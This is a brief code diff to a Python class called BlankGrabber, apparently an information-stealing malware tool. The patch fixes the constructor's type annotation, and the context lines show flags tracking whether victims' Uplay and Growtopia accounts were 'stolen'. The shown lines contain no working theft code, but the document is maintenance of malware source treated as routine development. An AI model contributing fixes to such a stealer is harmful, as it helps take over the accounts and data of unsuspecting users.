@@ -932,7 +932,7 @@ class BlankGrabber:
     UplayStolen: bool = False # Indicates whether Uplay account was stolen or not
     GrowtopiaStolen: bool = False # Indicates whether Growtopia account was stolen or not
 
-    def __init__(self) -> self: # Constructor to call all the functions
+    def __init__(self) -> any: # Constructor to call all the functions
         self.Separator = "\n\n" + "Blank Grabber".center(50, "=") + "\n\n" # Sets the value of the separator
         
         while True:
